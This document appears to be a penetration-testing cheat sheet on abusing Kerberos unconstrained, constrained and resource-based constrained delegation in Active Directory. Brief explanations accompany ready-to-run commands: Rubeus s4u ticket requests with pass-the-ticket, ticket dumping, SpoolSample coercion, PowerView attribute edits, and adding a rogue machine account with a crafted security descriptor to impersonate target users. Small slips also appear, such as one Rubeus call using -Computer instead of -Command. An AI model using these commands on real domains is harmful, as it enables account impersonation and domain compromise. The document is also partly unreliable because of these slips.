# Unconstrained Delegation
An account with a set SPN (e.g. Service A) can impersonate an user using the service set via the SPN at any other service in Active Directory. For this purpose, the service can use the user's ticket granting ticket, which is send together with the TGS for Service A.

## Prerequisites
NOT_DELEGATED UAC flag of target user must be false
TRUSTED_FOR_DELEGATION UAC flag in the attributes of the attacker account associated SPN must be true (only domain admins have typically the SeEnableDelegationPrivilege right to change this flag)

## Result
Domain Controller responds with target user TGT

## Commands
- using S4U2Self
Invoke-Rubeus -Command 's4u /user:<attackerComputerA> /rc4:<attackerNtlmHash> /impersonateuser:<targetUser> /msdsspn:"cifs/<fqdnTargetComputerB>" /ptt'

- using spoolservice (rubeus monitor needs elevated context)
Invoke-Rubeus -Command 'monitor /interval:1'
SpoolSample.exe <targetComputer> <attackerComputer>

- using cached ticket
Invoke-Rubeus -Command 'dump'
Invoke-Rubeus -Computer 'ptt /ticket:<base64Ticket>'


# Constrained Delegation
An account with a set SPN (e.g. Computer A with Service A) can impersonate an user using Service A at other services in Active Directory. Impersonation can be applied to services (e.g. Service B) defined in the msDS-AllowedToDelegateTo attribute of Computer A. The impersonation is performed by using the S4U2Proxy Extension, after the user authenticates to Service A. It is also possible to impersonate the user for an alternative service, as long as these service are provided by Computer B. This is because the service part of the SPN (<spn>/<fqdn>) in a service ticket is not signed by Kerberos and thus can later be manipulated.

## Prerequisites
NOT_DELEGATED UAC flag of target user must be false
msDS-AllowedToDelegateTo attribute of Computer A must hold Service B 

## Result
Domain Controller responds with TGS of target user for Service B - this TGS can be used for alternative services provided on Computer B

## Commands
- check allowed SPNs
Get-DomainUser <attackerComputerA> -Properties samaccountname,msds-allowedtodelegateto | Select -Expand msds-allowedtodelegateto

- if SPN already contains cifs or desired service as SPN
[Reflection.Assembly]::LoadWithPartialName('System.IdentityModel') | out-null
$idToImpersonate = New-Object System.Security.Principal.WindowsIdentity @('<targetUser>')
$idToImpersonate.Impersonate()
[System.Security.Principal.WindowsIdentity]::GetCurrent() | select name

- otherwise ask for TGS and insert alternative service
Invoke-Rubeus -Command 's4u /user:<attackerComputerA> /rc4:<ntlmHashComputerA> /impersonateuser:<targetUser> /msdsspn:"<service>/<fqdnTargetComputerB>" /altservice:cifs /ptt'


# Resource Based Constrained Delegation
An account (e.g. Computer A) with set SPN (e.g. Service A) can impersonate an user using Service A at other services (e.g. Service B of Computer B) in Active Directory. Impersonation can only take place if the msDS-AllowedToActOnBehalfOfOtherIdentity attribute of Service B lists Computer A.

## Prerequisites
NOT_DELEGATED UAC flag of target user must be false
msDS-AllowedToActOnBehalfOfOtherIdentity attribute of Computer B must hold Service A 
One Domaincontroller with OS at least Windows Server 2012

## Result
Domain Controller responds with TGS of target user for Service A - this TGS can be used for alternative services

## Commands
- check machine account quota (powerview)
Get-DomainObject -Domain <domain> -Properties ms-ds-machineaccountquota | Select -First 1

- check DC OS
Get-NetDomainController | Select name,osversion | Format-List

- check present SPN in msDS-AllowedToActOnBehalfOfOtherIdentity attribute
Get-NetComputer <targetComputer> | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity

- add new computer to domain if necessary (powermad)
New-MachineAccount -MachineAccount <newComputer> -Password $(ConvertTo-SecureString '<newComputerPassword>' -AsPlainText -Force)

- get SID of new computer
Get-NetComputer <newComputer> -Properties objectsid | Select -Expand objectsid

- create a raw security descriptor for the new computer
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<newComputerSid>)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

- add new value to msDS-AllowedToActOnBehalfOfOtherIdentity attribute
Get-NetComputer <targetComputer> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose

- check added msDS-AllowedToActOnBehalfOfOtherIdentity attribute
Get-NetComputer <targetComputer> -Properties 'msds-allowedtoactonbehalfofotheridentity'

- ask for TGS
Invoke-Rubeus -Command 's4u /user:<newComputer> /rc4:<newComputerNtlmHash> /impersonateuser:<targetUser> /msdsspn:cifs/<fqdnTargetComputerB> /ptt'

# S4U2Proxy
The service-for-User-to-Proxy extension works for resource-based constrained delegation even if the provided TGS of the user is not forwardable (design error of microsoft).

# S4U2Self
The service-for-User-to-Self extension allows a service (e.g., Service A on Computer A) to request a service ticket on behalf of a user (e.g., user X) for another service (e.g., Service B) from the domain controller without user X having to interact with Service A beforehand. Computer A therefore does not need a service ticket from user X for Service A to request a service ticket for Service B on behalf of user X. In order to work, the TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION UAC flag of Service A need to be set to true. This permission is typically granted by a domain admin. If the flag is not true the resulting TGS of user X will not be forwardable.

